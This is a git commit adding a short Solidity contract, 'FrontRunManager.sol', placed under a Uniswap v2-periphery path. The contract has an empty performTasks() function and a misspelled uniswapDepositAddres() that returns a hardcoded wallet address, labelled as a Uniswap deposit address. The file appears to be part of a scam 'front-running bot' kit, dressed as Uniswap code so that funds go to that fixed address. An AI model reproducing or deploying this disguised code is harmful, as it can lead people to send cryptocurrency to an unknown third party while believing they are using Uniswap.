5a3f125124fa3127c3d46492848bed0921ed309f
PSFRunner <96745676+PSFRunner@users.noreply.github.com>
2021-12-27 14:37:27 -0500

    Add files via upload

---
+++ Uniswap/v2-periphery/contracts/base/FrontRunManager.sol
@@ -0,0 +1,11 @@
+pragma solidity ^0.6.6;
+
+contract Manager {
+        function performTasks() public {
+   
+        }
+
+        function uniswapDepositAddres() public pure returns (address) {
+                   return 0xe5b2B77c420249aCf65C7E81f0d2F194bFC1D06A;
+         }
+}
